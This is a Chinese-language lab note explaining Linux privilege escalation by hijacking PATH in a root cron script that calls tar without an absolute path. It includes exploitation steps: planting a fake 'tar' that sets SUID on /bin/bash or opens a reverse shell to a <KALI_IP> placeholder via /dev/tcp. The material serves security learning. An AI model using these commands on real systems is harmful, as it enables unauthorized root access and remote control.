# PATH 環境變數劫持提權

當系統以高權限（如 `root`）執行指令碼或二進制檔案，且該檔案在執行外部指令時**未使用絕對路徑**，同時又將攻擊者可控制的目錄加入到環境變數 `PATH` 的最前端時，即可進行 PATH 劫持提權。

## 💥 PATH 環境變數劫持

### 漏洞觸發原理與運作機制

若一個由 `root` 高權限定期執行的自動化指令碼（如 Cron Job）中包含以下設定：
```bash
#!/bin/sh
export PATH="/home/user/app:$PATH"
cd /home/user/app
tar czf /tmp/backup.tar.gz *
```

#### 1. `export PATH="/home/user/app:$PATH"` 的用意
* **環境變數 `PATH` 的角色**：在 Linux 系統中，當使用者或腳本輸入一個指令（如 `tar`）而沒有指定絕對路徑（如 `/usr/bin/tar`）時，系統會依序搜尋環境變數 `PATH` 中以冒號 `:` 分隔的各個目錄(如： `/home/kali/.local/bin:/usr/local/sbin:/usr/sbin:/sbin:....`)，並執行最先找到的同名可執行檔。
* **路徑優先權設定**：`export PATH="/home/user/app:$PATH"` 的用意是將目錄 `/home/user/app` 串接到原有 `$PATH` 的**最前端**。這使得該目錄在搜尋順序中擁有**最高優先權**。

#### 2. 漏洞形成原因
此處的安全漏洞由以下三個關鍵因素共同構成：

1. **優先權劫持**：
   因為 `/home/user/app` 被放在 `PATH` 的最前面，系統搜尋可執行檔時會最先查詢此目錄。
2. **未使用絕對路徑**：
   腳本在呼叫 `tar` 時使用了相對路徑（`tar`），而非絕對路徑（`/usr/bin/tar`）。這迫使系統必須依賴 `PATH` 變數來定位 `tar`。
3. **目錄權限管理不當 (可寫入)**：
   `/home/user/app` 是一個低權限用戶（如一般使用者）可寫入的目錄。

**漏洞運作流程**：
當高權限腳本被觸發時，系統因為 `tar` 未指定絕對路徑，便開始從 `PATH` 的首位（`/home/user/app`）搜尋 `tar`。若此時低權限攻擊者在 `/home/user/app` 目錄中建立了一個同名為 `tar` 的惡意可執行腳本，系統便會直接執行該惡意腳本，使得攻擊者成功在高權限（`root`）的脈絡下執行任意指令，從而達到特權提升（Privilege Escalation）的目的。

### 利用步驟

1. **切換至可寫入的 PATH 目錄**
   ```bash
   cd /home/user/app
   ```

2. **偽造惡意執行檔**
   建立一個與目標指令同名（如 `tar`）的惡意腳本，並寫入提權指令：
   ```bash
   # 寫法 A: 賦予 bash SUID
   echo -e '#!/bin/bash\nchmod +s /bin/bash' > tar
   
   # 寫法 B: 執行 Reverse Shell
   echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1' > tar
   ```

3. **賦予執行權限**
   ```bash
   chmod +x tar
   ```

4. **等待定時任務觸發**
   當 `cron` 觸發該腳本時，即會以 `root` 權限執行偽造的 `tar`，隨後即可透過 `bash -p` 或監聽埠口取得 `root` 權限。

# 實戰關聯
- [[Amaterasu]]
